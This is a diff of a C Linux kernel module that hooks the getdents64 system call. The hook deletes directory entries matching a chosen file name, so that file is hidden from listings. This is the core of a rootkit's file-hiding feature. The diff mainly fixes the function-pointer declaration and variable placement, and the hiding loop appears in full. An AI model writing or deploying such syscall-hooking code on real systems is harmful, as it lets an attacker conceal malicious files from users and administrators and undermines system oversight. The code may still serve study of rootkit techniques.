@@ -12,9 +12,9 @@
 
 uint64_t **sct;
 
-asmlinkage int *getdents64_original (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage int (*getdents64_original) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
-asmlinkage int  getdents64_hook     (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+asmlinkage int   getdents64_hook      (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
 /*
 run the actual system call,
 loop through the structs returned,
@@ -30,11 +30,13 @@ next: next    dirp
   int nob;
   struct linux_dirent64 *curr;
   char *next;
+  int i;
+  int len;
 
   nob = getdents64_original(fd, dirp, count);
   curr = dirp;
 
-  int i = 0;
+  i = 0;
   while(i < nob) {
     int size = curr->d_reclen;
 
@@ -43,7 +45,7 @@ next: next    dirp
     if(strncmp(curr->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
       printk("🍺 Found the file\n");
       next = (char*)curr + size;
-      int len = (uintptr_t)dirp + nob - (uintptr_t)next;
+      len = (uintptr_t)dirp + nob - (uintptr_t)next;
       memmove(curr, next, len);
       nob -= size;
       continue;
